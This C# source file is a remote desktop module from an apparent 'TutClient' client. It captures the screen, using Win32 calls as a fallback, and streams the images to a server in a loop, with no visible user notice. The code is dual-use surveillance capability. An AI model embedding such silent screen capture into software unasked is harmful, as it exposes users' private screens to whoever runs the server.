using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

using TutClient.Handlers;

namespace TutClient.Controls
{
    public interface IRDesktop
    {
        void Start();
        void Stop();
        void SetActiveScreen(int screenId);
    }

    /// <summary>
    /// Remote Desktop Module
    /// </summary>
    public class RDesktop : IRDesktop
    {
        private readonly IConnectionHandler _connectionHandler;
        private int _screenNumber = 0;

        /// <summary>
        /// True if we want to shutdown the streaming
        /// </summary>
        public bool IsShutdown = false;
        /// <summary>
        /// <see cref="byte"/> and <see cref="Image"/> Converter
        /// </summary>
        private readonly ImageConverter _convert = new ImageConverter();
        /// <summary>
        /// The byte array representation of the image
        /// </summary>
        private byte[] _img;

        private Thread _rdmThread;

        public RDesktop(IConnectionHandler connectionHandler)
        {
            _connectionHandler = connectionHandler;
            _connectionHandler.RemoteDesktopShutdown += (object sender, bool shutDown) =>
            {
                this.IsShutdown = shutDown;
            };
        }

        /// <summary>
        /// Start the remote desktop session
        /// </summary>
        public void Start()
        {
            if(IsShutdown)
            {
                _rdmThread = new Thread(StreamScreen); //Create a new thread for the remote desktop
                IsShutdown = false; //Enable the remote desktop to run
                _rdmThread.Start(); //Start the remote desktop
            }
        }

        public void Stop()
        {
            if(_rdmThread != null && IsShutdown == false)
            {
                IsShutdown = true;
            }
        }

        public void SetActiveScreen(int screenId)
        {
            _screenNumber = screenId;
        }

        /// <summary>
        /// Start sending screen images to the server
        /// </summary>
        private void StreamScreen()
        {
            while (true) //Infinite loop
            {
                if (IsShutdown) //Check if we need to stop
                {
                    break;
                }
                try
                {

                    _img = (byte[])_convert.ConvertTo(Desktop(), typeof(byte[])); //Convert the desktop image to bytes
                    if (_img != null) //If we have an image
                    {
                        SendScreen(_img); //Send the screen data to the server
                        Array.Clear(_img, 0, _img.Length); //Clear the bytes array of the image
                    }

                    Thread.Sleep(ApplicationSettings.FPS); //Use the specified FPS
                }
                catch //Something went wrong
                {
                    IsShutdown = true; //Exit the loop
                    break;
                }
            }
        }
        
        /// <summary>
        /// Get the <see cref="Bitmap"/> image of a desktop
        /// </summary>
        /// <returns>The <see cref="Bitmap"/> image of the desktop</returns>
        private Bitmap Desktop()
        {
            try
            {
                var bounds = _screenNumber == 0 
                    ? Screen.PrimaryScreen.Bounds 
                    : Screen.AllScreens[_screenNumber].Bounds; //Get the size of the screen

                var screenShot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb); //Create a bitmap holder

                using (var graph = Graphics.FromImage(screenShot)) //Load the holder into graphics
                {
                    graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy); //Take the screenshot
                }

                //Free resources
                GC.Collect();
                GC.WaitForPendingFinalizers();
                Thread.SpinWait(5000);

                return screenShot; //Return the image of the desktop
            }
            catch //Something went wrong
            {
                //Get the handle of the desktop window
                IntPtr desktopHwnd = FindWindowEx(GetDesktopWindow(), IntPtr.Zero, "Progman", "Program Manager");

                // get the desktop dimensions
                var rect = new Rectangle();
                GetWindowRect(desktopHwnd, ref rect);

                // saving the screenshot to a bitmap
                var bmp = new Bitmap(rect.Width, rect.Height);
                Graphics memoryGraphics = Graphics.FromImage(bmp);
                IntPtr dc = memoryGraphics.GetHdc();
                PrintWindow(desktopHwnd, dc, 0);
                memoryGraphics.ReleaseHdc(dc);

                //Free resources
                GC.Collect();
                GC.WaitForPendingFinalizers();
                Thread.SpinWait(5000);
                
                return bmp; //Return the image of the desktop
            }
            
        }

        /// <summary>
        /// Send desktop screen to the server
        /// </summary>
        /// <param name="img">The image to send as bytes</param>
        private void SendScreen(byte[] img)
        {
            try
            {
                var send = new byte[img.Length + 16]; //Create a new buffer to send to the server
                var header = Encoding.Unicode.GetBytes("rdstream"); //Get the bytes of the header

                // TODO: look into block copy vs array copy
                // https://stackoverflow.com/questions/1389821/array-copy-vs-buffer-blockcopy
                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
                Buffer.BlockCopy(img, 0, send, header.Length, img.Length); //Copy the image to the main buffer

                _connectionHandler.Send(send, SocketFlags.None);
            }
            catch (Exception ex) //Something went wrong
            {
                Console.WriteLine($"Unable to send screen to server. [ERROR]: {ex.Message}");
                Thread.Sleep(3000);
                IsShutdown = true; //Disconnect from server
            }
        }

        #region DLLImports
        /// <summary>
        /// Get the image of a window
        /// </summary>
        /// <param name="hwnd">Handle of the window</param>
        /// <param name="hdc">Pointer to the buffer to save the data to</param>
        /// <param name="nFlags">The flags of the print</param>
        /// <returns>The result of the screenshot</returns>
        [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hdc, uint nFlags);
        /// <summary>
        /// Get the rectangle bounds of a window
        /// </summary>
        /// <param name="handle">The handle of the window</param>
        /// <param name="rect">A reference to the Rectangle object to save the data to</param>
        /// <returns>The result of getting the bounds of the window</returns>
        [DllImport("user32.dll")]
        static extern bool GetWindowRect(IntPtr handle, ref Rectangle rect);
        /// <summary>
        /// Get the handle of the desktop window
        /// </summary>
        /// <returns>The handle of the desktop window</returns>
        [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
        static extern IntPtr GetDesktopWindow();
        /// <summary>
        /// Find a child window
        /// </summary>
        /// <param name="parentHandle">The handle of the parent window</param>
        /// <param name="childAfter">The handle of the child to get the child window after</param>
        /// <param name="lclassName">Class name of the window</param>
        /// <param name="windowTitle">Title string of the window</param>
        /// <returns>The handle to the child window</returns>
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);
        #endregion
    }
}

